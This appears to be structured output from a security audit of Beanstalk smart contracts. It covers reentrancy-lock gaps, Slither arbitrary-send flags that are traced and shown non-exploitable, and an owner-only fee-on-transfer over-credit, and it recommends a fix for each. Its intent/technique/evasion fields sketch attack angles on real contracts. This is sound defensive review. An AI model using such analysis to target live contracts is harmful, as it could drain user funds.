findings.recommendation: Add the shared nonReentrant modifier to claimFertilized, payFertilizer and mintFertilizer so the diamond-wide lock spans the full diamond<->Fertilizer round trip. This makes correctness independent of the internal effects-before-callback ordering in Fertilizer._update / Fertilizer1155, hardening the loop against future regressions.
critical_assumptions: A future change moves a fund-affecting effect after the payFertilizer or onERC1155Received callback (currently effects precede both).
The onERC1155Received recipient can reach a diamond fund-mover that observes mid-update fertilizer accounting (currently the mint is the last action and lastBpf is pre-updated).

The gap is the absence of any shared reentrancy lock across the diamond<->Fertilizer boundary, so correctness is purely ordering-dependent.

findings.title: Arbitrary-send sinks non-exploitable: all callers authenticate sender
findings.description: Resolution of the High slither arbitrary-send-erc20 / arbitrary-send-eth flags from the access-control angle. (1) LibTransfer.transferToken/receiveToken take a `sender` parameter used as the safeTransferFrom `from` (LibTransfer.sol#39,64). Every active (non-L1-migration) caller was traced: MarketplaceFacet.fillPodListing (L36-38) and createPodOrder (L70), SiloFacet.deposit (L57), and TokenFacet.transferToken (L60) all pass LibTractor._user() (the authenticated publisher/msg.sender). The ONLY caller that forwards a raw `sender` param is TokenFacet.transferInternalTokenFrom (L67-86), and it is guarded: it uses From.INTERNAL (moves the sender's Beanstalk internal balance, not an external ERC20 approval) and, when sender != _user(), calls LibTokenApprove.spendAllowance(sender, _user(), token, amount) which reverts on insufficient allowance (LibTokenApprove.sol#36-42). No path forwards an attacker-controlled `from` without an allowance. (2) LibEth.refundEth (LibEth.sol#15-21) sends address(this).balance to msg.sender but is gated by s.sys.isFarm != 2 so it cannot fire mid-farm; it refunds leftover msg.value at the end of a single farm/pipe call frame (FarmFacet withEth, DepotFacet etherPipe/advancedPipe). (3) Pipeline._pipeMem arbitrary-send-eth executes in Pipeline's own standalone context (DepotFacet calls it via plain external call to a fixed PIPELINE address, NOT delegatecall), so it can only move the ETH the caller supplied, never diamond funds. Tractor was also reviewed: tractor() sets activePublisher to the signed blueprint.publisher and executes only the publisher-signed AdvancedFarmCall[]; the operator can paste only operator-supplied bytes into publisher-authorized positions (operatorPasteInstrs are part of the signed hash), and _setPublisher reverts on nesting (LibTractor.sol#95), so an operator cannot make the protocol act as the publisher beyond the signed scope.
findings.impact: None — documents that the High static arbitrary-send flags are call-site mitigated; recorded so triage does not re-open them as exploitable.
findings.recommendation: No change required. Retain the convention that every LibTransfer caller passes LibTractor._user() (or enforces spendAllowance for a non-_user sender). Add a code comment / lint rule asserting this for any future caller.

ite.intent: (Non-issue) Would-be arbitrary safeTransferFrom from an arbitrary approver / arbitrary ETH drain — verified unreachable.
ite.technique: Slither flags LibTransfer.*(sender) and LibEth/Pipeline ETH sends; every active call site passes _user(), enforces spendAllowance, gates on isFarm, or runs in Pipeline's own balance-less context.
ite.evasion: Defense is the call-site convention (sender == _user()) plus the internal-balance allowance check and the isFarm refund gate; no gap found.

findings.title: addMigratedUnderlying credits trusted amount, not measured balance diff
findings.description: UnripeFacet.addMigratedUnderlying (contracts/beanstalk/barn/UnripeFacet.sol#284-295) does safeTransferFrom(user, this, amount) then LibUnripe.incrementUnderlying(unripeToken, amount), crediting the caller-supplied `amount` rather than the actually-received balance delta. If the underlying token charges a fee-on-transfer or rebases down, balanceOfUnderlying is credited more than was received, breaking the invariant balanceOfUnderlying <= actual token balance and over-valuing chop/redemption math (unripeToUnderlying / _getUnderlying read balanceOfUnderlying). The same trust-the-amount pattern (vs the balance-diff accounting that LibTransfer.receiveToken uses) appears here. However the function is gated by LibDiamond.enforceIsContractOwner() and nonReentrant, the underlying token is owner-chosen, and it carries noNetFlow/noSupplyChange invariant guards, so this is a privileged-only correctness/operational concern, not a permissionless exploit.

LibUnripe.incrementUnderlying(unripeToken, amount);

findings.impact: Owner-only: if a fee-on-transfer/rebasing underlying is ever set, balanceOfUnderlying is over-credited, inflating per-unripe redemption (unripeToUnderlying) above the real backing. No permissionless path; requires owner to migrate to a non-standard underlying.
findings.recommendation: Measure the balance delta (balanceAfter - balanceBefore) and pass that to incrementUnderlying, mirroring LibTransfer.receiveToken's fee-on-transfer-safe accounting, instead of trusting `amount`.

ite.intent: (Privileged) Over-credit Unripe Token underlying backing if a fee-on-transfer underlying is migrated in, inflating later redemptions.
ite.technique: addMigratedUnderlying transfers `amount` then incrementUnderlying(amount) without measuring received balance (UnripeFacet.sol#289-294).
ite.evasion: enforceIsContractOwner + nonReentrant + noNetFlow gate the function; the residual gap is only the unmeasured FoT delta, reachable solely by the owner choosing a non-standard underlying.

critical_assumptions: Contract owner is the caller (function is enforceIsContractOwner-gated).
The migrated underlying token is fee-on-transfer or rebasing (standard ERC-20 underlying credits correctly).
